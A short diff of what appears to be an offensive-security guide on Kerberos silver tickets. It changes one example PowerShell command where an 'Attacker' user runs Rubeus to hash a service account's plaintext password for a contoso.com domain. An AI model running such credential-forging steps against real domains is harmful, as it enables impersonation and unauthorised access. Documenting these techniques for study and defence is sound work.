@@ -112,7 +112,7 @@ Another use-case for silver tickets is when combined with other attacks that all
 First, convert the known plaintext credential into its hash equivalents.
 
 ```powershell
-PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:MSSQLSvc /domain:dublin.contoso.com /password:Passw0rd!
 
 [*] Action: Calculate Password Hash(es)
 
